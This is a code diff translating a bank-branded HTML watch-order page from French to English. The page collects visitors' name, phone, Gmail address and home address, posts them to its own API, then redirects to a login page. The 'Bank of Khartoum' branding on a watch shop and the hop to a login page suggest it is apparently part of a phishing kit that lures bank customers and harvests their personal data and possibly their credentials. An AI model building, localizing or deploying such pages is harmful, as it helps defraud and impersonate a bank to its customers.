@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr" dir="ltr">
+<html lang="en" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Données de commande</title>
+<title>Order Details</title>
 <style>
   :root{--bg:#ffffff;--ink:#141414;--muted:#8a8f98;--line:#e3e3e3;--accent:#e02424}
   *{box-sizing:border-box;margin:0;padding:0}
@@ -62,62 +62,62 @@
 </head>
 <body>
   <header>
-    <a class="icon-btn" href="colors-fr.html" aria-label="Retour">‹</a>
-    <span class="title">Données de commande</span>
+    <a class="icon-btn" href="colors-en.html" aria-label="Back">&#8249;</a>
+    <span class="title">Order Details</span>
     <img src="images/logo.jpg" alt="BOK" style="height:46px;margin-inline-start:auto">
   </header>
 
   <div class="summary" id="summary">
     <div class="pic"><img id="sumImg" src="" alt=""></div>
     <div>
-      <div class="t">Montre choisie</div>
-      <div class="n" id="sumName">—</div>
+      <div class="t">Selected watch</div>
+      <div class="n" id="sumName">&mdash;</div>
     </div>
   </div>
 
   <form id="orderForm">
-    <h1>Complétez vos informations</h1>
-    <p class="lead">Veuillez saisir vos informations pour finaliser la commande</p>
+    <h1>Complete your information</h1>
+    <p class="lead">Please enter your information to finalize the order</p>
 
     <div class="field">
-      <label for="name">Nom complet</label>
-      <input id="name" name="name" type="text" placeholder="ex: Mohamed Amine" required>
+      <label for="name">Full name</label>
+      <input id="name" name="name" type="text" placeholder="e.g: Mohamed Amine" required>
     </div>
 
     <div class="field">
-      <label for="phone">Numéro de téléphone</label>
+      <label for="phone">Phone number</label>
       <input id="phone" name="phone" type="tel" placeholder="05 00 00 00 00"
              inputmode="tel" pattern="[0-9+ ]{6,}" required>
     </div>
 
     <div class="field">
-      <label for="email">Adresse e-mail (Gmail)</label>
+      <label for="email">Email address (Gmail)</label>
       <input id="email" name="email" type="email" placeholder="example@gmail.com" required>
     </div>
 
     <div class="field">
-      <label for="wilaya">Wilaya</label>
+      <label for="wilaya">State</label>
       <select id="wilaya" name="wilaya" required>
-        <option value="" disabled selected>Choisir la wilaya</option>
+        <option value="" disabled selected>Choose state</option>
       </select>
     </div>
 
     <div class="field">
-      <label for="address">Adresse de contact</label>
-      <textarea id="address" name="address" placeholder="Commune, quartier, rue..." required></textarea>
+      <label for="address">Contact address</label>
+      <textarea id="address" name="address" placeholder="City, neighborhood, street..." required></textarea>
     </div>
 
-    <button class="submit" type="submit">Confirmer la commande</button>
+    <button class="submit" type="submit">Confirm order</button>
   </form>
 
   <div class="done" id="done">
-    <div class="check">✓</div>
-    <h2>Commande reçue</h2>
-    <p>Merci, nous vous contacterons bientôt sur votre numéro pour confirmer la commande et la livraison.</p>
-    <a href="index-fr.html">Retour à l'accueil</a>
+    <div class="check">&#10003;</div>
+    <h2>Order received</h2>
+    <p>Thank you, we will contact you soon on your number to confirm the order and delivery.</p>
+    <a href="index-en.html">Back to home</a>
   </div>
 
-  <footer style="background:#141414;color:#fff;text-align:center;padding:18px 16px;font-size:13px;font-weight:500">Tous droits réservés &copy; Bank of Khartoum</footer>
+  <footer style="background:#141414;color:#fff;text-align:center;padding:18px 16px;font-size:13px;font-weight:500">All rights reserved &copy; Bank of Khartoum</footer>
 
 <script>
   const wilayas = [
@@ -140,15 +140,15 @@
   });
 
   const watches = [
-    {img:"images/6.png",name:"Rouge audacieux"},{img:"images/3.png",name:"Argent élégant"},
-    {img:"images/2.png",name:"Or luxueux"},{img:"images/1.png",name:"Noir classique"},
-    {img:"images/4.png",name:"Orange vif"},{img:"images/5.png",name:"Bleu royal"},
-    {img:"images/7.png",name:"Vert militaire"},{img:"images/8.png",name:"Rose doux"},
-    {img:"images/9.png",name:"Violet foncé"},{img:"images/10.png",name:"Blanc pur"},
-    {img:"images/11.png",name:"Marron terre"},{img:"images/12.png",name:"Rose poudré"},
-    {img:"images/13.png",name:"Turquoise"},{img:"images/14.png",name:"Bleu marine"},
-    {img:"images/15.png",name:"Menthe"},{img:"images/16.png",name:"Jaune éclatant"},
-    {img:"images/17.png",name:"Corail"},{img:"images/18.png",name:"Lavande"}
+    {img:"images/6.png",name:"Bold Red"},{img:"images/3.png",name:"Elegant Silver"},
+    {img:"images/2.png",name:"Luxurious Gold"},{img:"images/1.png",name:"Classic Black"},
+    {img:"images/4.png",name:"Vibrant Orange"},{img:"images/5.png",name:"Royal Blue"},
+    {img:"images/7.png",name:"Military Green"},{img:"images/8.png",name:"Soft Pink"},
+    {img:"images/9.png",name:"Dark Purple"},{img:"images/10.png",name:"Pure White"},
+    {img:"images/11.png",name:"Earth Brown"},{img:"images/12.png",name:"Powder Pink"},
+    {img:"images/13.png",name:"Turquoise"},{img:"images/14.png",name:"Navy Blue"},
+    {img:"images/15.png",name:"Mint"},{img:"images/16.png",name:"Bright Yellow"},
+    {img:"images/17.png",name:"Coral"},{img:"images/18.png",name:"Lavender"}
   ];
   const pick = parseInt(new URLSearchParams(location.search).get("w"));
   if(!isNaN(pick) && watches[pick]){
@@ -161,7 +161,7 @@
     e.preventDefault();
     const btn = document.querySelector(".submit");
     btn.disabled = true;
-    btn.textContent = "Envoi en cours...";
+    btn.textContent = "Sending...";
     try {
       const watchColor = (!isNaN(pick) && watches[pick]) ? watches[pick].name : "";
       const res = await fetch("/api/orders", {
@@ -179,11 +179,11 @@
       });
       const data = await res.json();
       if (!data.success) throw new Error(data.message);
-      location.href = "login-fr.html" + (data.order_id ? "?order=" + data.order_id : "");
+      location.href = "login-en.html" + (data.order_id ? "?order=" + data.order_id : "");
     } catch(err) {
-      alert("Erreur : " + err.message);
+      alert("Error: " + err.message);
       btn.disabled = false;
-      btn.textContent = "Confirmer la commande";
+      btn.textContent = "Confirm order";
     }
   });
 </script>
